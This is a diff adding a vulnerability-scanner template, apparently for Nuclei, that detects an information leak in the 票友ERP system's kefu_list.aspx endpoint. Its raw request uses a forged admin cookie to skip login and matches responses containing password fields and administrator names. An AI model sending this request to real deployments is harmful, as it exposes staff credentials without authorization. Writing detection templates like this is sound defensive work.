@@ -1,0 +1,30 @@
+id: piaoyouERP-kefu_list-info
+
+info:
+  name: 票友ERP管理系统 kefu_list.aspx 存在信息泄露漏洞
+  author: piaoyouERP
+  severity: high
+  tags: piaoyouERP
+
+http:
+  - raw:
+      - |+
+        GET /json_db/kefu_list.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+        Accept: */*
+        Cookie: pyerpcookie=loginname=admin
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"password":'
+          - '"truename":'
+          - '系统管理员'
+        condition: and
